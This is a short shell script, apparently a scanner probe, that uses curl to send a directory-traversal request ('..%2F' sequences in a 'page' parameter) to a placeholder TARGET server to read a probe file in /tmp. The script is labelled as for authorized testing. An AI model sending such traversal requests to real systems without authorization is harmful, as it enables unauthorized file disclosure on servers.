#!/usr/bin/env sh
set -eu
# Authorized testing only. Replace TARGET after review.
curl -sS -i -X GET 'http://TARGET:8080/029.php?page=..%2F..%2F..%2F..%2Ftmp%2Fsunset_probe.txt' \
  -H 'User-Agent: Sunset-AWVS-Probe/1.0' \
  -H 'Accept: */*'
